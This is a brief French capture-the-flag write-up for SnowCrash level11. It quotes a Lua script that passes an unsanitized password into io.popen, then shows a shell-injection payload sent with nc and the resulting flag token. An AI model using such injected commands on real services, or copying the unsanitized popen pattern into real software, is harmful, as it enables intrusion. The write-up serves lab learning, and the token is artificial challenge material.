En lisant le script lua, on retrouve une concatenation de string non sanitizee dans une commande : 

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
[...]
```
Il sufit d'effectuer une injection:

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: hola ; getflag > /tmp/nn; echo loa
Erf nope..
level11@SnowCrash:~$ cat /tmp/nn
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
